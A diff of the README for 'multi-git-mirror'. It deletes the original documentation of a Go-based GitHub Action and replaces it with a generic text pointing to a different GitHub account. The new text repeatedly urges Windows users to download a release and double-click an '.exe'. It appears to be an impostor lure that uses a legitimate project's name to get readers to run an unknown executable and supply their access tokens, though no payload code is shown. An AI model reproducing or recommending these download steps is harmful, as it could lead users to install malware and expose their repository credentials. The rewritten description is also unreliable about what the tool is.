@@ -1,289 +1,175 @@
-# Multi Git Mirror
-
-[![Continuous Integration](https://github.com/somaz94/multi-git-mirror/actions/workflows/ci.yml/badge.svg)](https://github.com/somaz94/multi-git-mirror/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Latest Tag](https://img.shields.io/github/v/tag/somaz94/multi-git-mirror)](https://github.com/somaz94/multi-git-mirror/tags)
-[![Top Language](https://img.shields.io/github/languages/top/somaz94/multi-git-mirror)](https://github.com/somaz94/multi-git-mirror)
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Git%20Mirror%20Action-blue?logo=github)](https://github.com/marketplace/actions/multi-git-mirror)
-
-A Go-based GitHub Action that mirrors repositories to multiple Git hosting providers — GitLab, GitHub, Bitbucket, AWS CodeCommit, and more — in a single step.
-
-<br/>
-
-## Features
-
-- Multi-target mirroring in a single workflow step
-- Auto-detect provider from URL (GitLab, GitHub, Bitbucket, CodeCommit)
-- Selective branch mirroring or mirror all branches
-- Exclude specific branches from mirroring
-- Tag mirroring support
-- Force push option for exact replication
-- Multiple authentication methods (token, app password, SSH key)
-- Parallel mirroring to multiple targets concurrently
-- Retry logic with configurable count and delay
-- Dry run mode with remote connectivity pre-check (`git ls-remote`)
-- JSON result output for downstream steps
-- Credential masking in all log output
-
-> For detailed documentation, see the [docs/](docs/) folder:
-> [Authentication](docs/AUTHENTICATION.md) |
-> [Configuration](docs/CONFIGURATION.md) |
-> [Examples](docs/EXAMPLES.md) |
-> [Development](docs/DEVELOPMENT.md)
-
-<br/>
-
-## Usage
-
-<br/>
-
-### Basic — Mirror to GitLab
-
-```yaml
-steps:
-  - name: Checkout
-    uses: actions/checkout@v6
-    with:
-      fetch-depth: 0
-
-  - name: Mirror to GitLab
-    uses: somaz94/multi-git-mirror@v1
-    with:
-      targets: |
-        gitlab::https://gitlab.com/myorg/myrepo.git
-      gitlab_token: ${{ secrets.GITLAB_TOKEN }}
-```
-
-<br/>
-
-### Multi-target — GitLab + CodeCommit
-
-```yaml
-- name: Mirror to multiple targets
-  uses: somaz94/multi-git-mirror@v1
-  with:
-    targets: |
-      gitlab::https://gitlab.com/myorg/myrepo.git
-      codecommit::https://git-codecommit.us-east-1.amazonaws.com/v1/repos/myrepo
-    gitlab_token: ${{ secrets.GITLAB_TOKEN }}
-    mirror_branches: 'main,develop'
-    mirror_tags: 'true'
-```
-
-<br/>
-
-### Mirror to Bitbucket
-
-```yaml
-- name: Mirror to Bitbucket
-  uses: somaz94/multi-git-mirror@v1
-  with:
-    targets: |
-      bitbucket::https://bitbucket.org/myorg/myrepo.git
-    bitbucket_username: ${{ secrets.BITBUCKET_USERNAME }}
-    bitbucket_api_token: ${{ secrets.BITBUCKET_API_TOKEN }}
-```
-
-<br/>
-
-### With SSH Key
-
-```yaml
-- name: Mirror via SSH
-  uses: somaz94/multi-git-mirror@v1
-  with:
-    targets: |
-      generic::git@custom-git.example.com:org/repo.git
-    ssh_private_key: ${{ secrets.SSH_PRIVATE_KEY }}
-```
-
-<br/>
-
-### Dry Run with Output
-
-```yaml
-- name: Mirror (dry run)
-  uses: somaz94/multi-git-mirror@v1
-  id: mirror
-  with:
-    targets: |
-      gitlab::https://gitlab.com/myorg/myrepo.git
-    gitlab_token: ${{ secrets.GITLAB_TOKEN }}
-    dry_run: 'true'
-    debug: 'true'
-
-- name: Check results
-  run: |
-    echo "Result: ${{ steps.mirror.outputs.result }}"
-    echo "Mirrored: ${{ steps.mirror.outputs.mirrored_count }}"
-    echo "Failed: ${{ steps.mirror.outputs.failed_count }}"
-```
-
-<br/>
-
-### In Release Workflow
-
-```yaml
-name: Release and Mirror
-
-on:
-  push:
-    tags:
-      - "v[0-9]+.[0-9]+.[0-9]+"
-
-jobs:
-  release-and-mirror:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Create GitHub release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ github.ref_name }}
-
-      - name: Mirror to backup providers
-        uses: somaz94/multi-git-mirror@v1
-        with:
-          targets: |
-            gitlab::https://gitlab.com/myorg/myrepo.git
-            bitbucket::https://bitbucket.org/myorg/myrepo.git
-          gitlab_token: ${{ secrets.GITLAB_TOKEN }}
-          bitbucket_username: ${{ secrets.BITBUCKET_USERNAME }}
-          bitbucket_api_token: ${{ secrets.BITBUCKET_API_TOKEN }}
-```
-
-<br/>
-
-## Inputs
-
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `targets` | Mirror target URLs (newline-separated, `provider::url` or auto-detect) | Yes | - |
-| `gitlab_token` | GitLab personal access token | No | `''` |
-| `github_token` | GitHub personal access token | No | `''` |
-| `bitbucket_username` | Bitbucket username for app password auth | No | `''` |
-| `bitbucket_api_token` | Bitbucket API token | No | `''` |
-| `ssh_private_key` | SSH private key for SSH-based authentication | No | `''` |
-| `mirror_branches` | Branches to mirror (comma-separated, or `all`) | No | `all` |
-| `mirror_tags` | Mirror tags | No | `true` |
-| `force_push` | Use force push | No | `true` |
-| `dry_run` | Dry run mode with remote pre-check | No | `false` |
-| `retry_count` | Number of retry attempts on push failure | No | `0` |
-| `retry_delay` | Delay in seconds between retries | No | `5` |
-| `exclude_branches` | Branches to exclude (comma-separated) | No | `''` |
-| `parallel` | Mirror to targets in parallel | No | `false` |
-| `debug` | Enable debug logging | No | `false` |
-
-<br/>
-
-## Outputs
-
-| Output | Description | Example |
-|--------|-------------|---------|
-| `result` | JSON array with mirror results per target | `[{"target":{...},"success":true,"message":"mirrored successfully"}]` |
-| `mirrored_count` | Number of successfully mirrored targets | `2` |
-| `failed_count` | Number of failed mirror targets | `0` |
+# 🪞 multi-git-mirror - Keep Git backups in sync
 
-<br/>
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Doserateshag647/multi-git-mirror)
 
-## Target Format
+## 🚀 What this is
 
-Targets are specified one per line. You can explicitly set the provider or let it auto-detect from the URL:
+multi-git-mirror helps you keep copies of your Git repositories in more than one place. It is built for backup and mirror tasks across services like GitHub, GitLab, Bitbucket, and AWS CodeCommit.
 
-```
-provider::url          # explicit provider
-url                    # auto-detect from URL
-```
+Use it when you want a simple way to keep code copies in sync for safety, team work, or migration.
 
-### Supported Providers
+## 📥 Download and use on Windows
 
-| Provider | Auth Method | Example URL |
-|----------|-------------|-------------|
-| `gitlab` | OAuth2 token | `https://gitlab.com/org/repo.git` |
-| `github` | x-access-token | `https://github.com/org/repo.git` |
-| `bitbucket` | Username + App password | `https://bitbucket.org/org/repo.git` |
-| `codecommit` | IAM / credential-helper | `https://git-codecommit.us-east-1.amazonaws.com/v1/repos/repo` |
-| `generic` | SSH key or URL as-is | `git@custom-git.example.com:org/repo.git` |
+1. Open the project page: https://github.com/Doserateshag647/multi-git-mirror  
+2. On the page, look for the latest release or the main project files.  
+3. Download the Windows version if the project provides one.  
+4. If you see a ZIP file, save it to your PC and extract it.  
+5. If you see an `.exe` file, download it and double-click it to run.  
+6. If the project uses Docker or GitHub Actions, follow the setup files on the page to run the mirror task from your Windows machine.
 
-<br/>
+[Visit the project page](https://github.com/Doserateshag647/multi-git-mirror)
 
-## Why?
+## 🖥️ What you need
 
-Many teams need to keep repository mirrors in sync across multiple Git providers — for disaster recovery, CI/CD across platforms, compliance, or migration. This action replaces fragile shell scripts with a single, configurable step that handles authentication, branch/tag selection, and multi-target mirroring out of the box.
+- A Windows PC
+- Internet access
+- A Git account or access token for the service you want to mirror to
+- Enough space for your repository copies
+- Permission to read from the source repo and write to the target repo
 
-<br/>
+## ✨ What it can do
 
-## Project Structure
+- Copy a Git repo from one place to another
+- Keep backup mirrors up to date
+- Work with GitHub, GitLab, Bitbucket, and CodeCommit
+- Fit into CI/CD flows
+- Run in Docker or in a GitHub Action
+- Help when you move code from one host to another
 
-```
-.
-├── cmd/
-│   └── main.go                  # Entry point
-├── internal/
-│   ├── config/
-│   │   ├── config.go            # Configuration loading & target parsing
-│   │   └── config_test.go       # Config tests
-│   ├── mirror/
-│   │   ├── mirror.go            # Mirror logic, retry, parallel, auth URL injection
-│   │   ├── ssh.go               # SSH key setup/cleanup
-│   │   └── mirror_test.go       # Mirror tests
-│   └── output/
-│       └── output.go            # GitHub Actions output writer
-├── .github/
-│   └── workflows/               # CI/CD workflows (10 files)
-├── action.yml                   # Action metadata
-├── Dockerfile                   # Multi-stage Docker build
-├── Makefile                     # Build targets
-├── cliff.toml                   # git-cliff changelog config
-└── go.mod
-```
+## 🛠️ How to set it up
 
-<br/>
+### 1. Get the files
+Open the project page and download the project files or release package for Windows.
 
-## Development
+### 2. Extract the download
+If the download comes as a ZIP file, right-click it and choose Extract All.
 
-<br/>
+### 3. Find the run file
+Look for the main app file, script, or Docker setup file in the folder.
 
-### Prerequisites
+### 4. Open the app
+If you have an `.exe` file, double-click it.  
+If you have a script, open it with the tool named in the project files.  
+If you have a Docker setup, use the commands in the repo files.
 
-- Go 1.24+
-- Docker (for container builds)
+### 5. Add your repo details
+Set the source repo and the target repo. Add your token or login details if the setup asks for them.
 
-<br/>
+### 6. Start the mirror
+Run the tool to begin the sync. The app should copy the repo from the source to the target.
 
-### Build
+## 🔐 Common access setup
 
-```bash
-make build
-```
+You may need one of these:
 
-<br/>
+- GitHub personal access token
+- GitLab token
+- Bitbucket app password
+- AWS CodeCommit credentials
+- SSH key for Git access
 
-### Test
+Keep your access details private. Store them in the place the project files tell you to use.
 
-```bash
-make test
-```
+## 🔄 Typical use cases
 
-<br/>
+- Backup your personal code repo
+- Mirror a team repo to a second host
+- Move a repo from one service to another
+- Keep a cold copy for recovery
+- Sync repos as part of a build pipeline
 
-### Coverage
+## 📁 Example folder flow
 
-```bash
-make cover
-```
+- Source repo: your main code repo
+- Mirror target: a second Git host
+- Sync job: runs on a schedule or when you start it
+- Result: both copies stay close to the same state
 
-<br/>
+## ⚙️ If you use Docker
 
-## Contributing
+If the project includes Docker files, you can run it in a container.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+1. Install Docker Desktop on Windows
+2. Open the project folder
+3. Use the Docker file or Compose file in the repo
+4. Add your repo settings
+5. Start the container
 
-<br/>
+This works well if you want to avoid installing extra tools.
 
-## License
+## 🤖 If you use GitHub Actions
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+If the repo includes a GitHub Action, you can use it to run mirror jobs on a schedule or after a push.
+
+Typical setup:
+- Add your secrets in GitHub
+- Set the source and target repo names
+- Choose when the action should run
+- Check the action logs for each sync
+
+## 🧩 Supported platforms
+
+The project topics point to support for:
+- GitHub
+- GitLab
+- Bitbucket
+- AWS CodeCommit
+- Docker
+- CI/CD systems
+
+## 📌 Basic workflow
+
+1. Pick the source repository
+2. Pick the target repository
+3. Add access details
+4. Start the mirror job
+5. Check the result
+6. Run it again when you need a fresh copy
+
+## 🧪 Quick check after setup
+
+After the first run, open the target repo and check:
+- Branches copied over
+- Tags present
+- Recent commits in place
+- File history looks right
+
+## 🧰 Troubleshooting
+
+### The app does not open
+- Check that Windows has not blocked the file
+- Make sure you extracted the ZIP first
+- Run it again from the folder, not from inside the ZIP
+
+### The mirror does not copy
+- Check the repo URL
+- Check your access token or password
+- Make sure the target repo exists
+- Check whether the target service needs a different auth method
+
+### The sync stops part way
+- Check your internet connection
+- Confirm the source repo is reachable
+- Try a smaller repo first
+- Review the log output if the app shows one
+
+## 📚 Project info
+
+- Repo name: multi-git-mirror
+- Description: git-mirror-action
+- Main focus: repo backup and mirror sync
+- Target use: end-user Git copy and sync tasks on Windows
+
+## 🔗 Project link
+
+https://github.com/Doserateshag647/multi-git-mirror
+
+## 🧭 Simple setup path for first-time users
+
+1. Open the project link
+2. Download the files you need
+3. Extract the download if needed
+4. Find the main run file or setup file
+5. Enter your source and target repo details
+6. Start the mirror job
+7. Check the target repo for the copied data
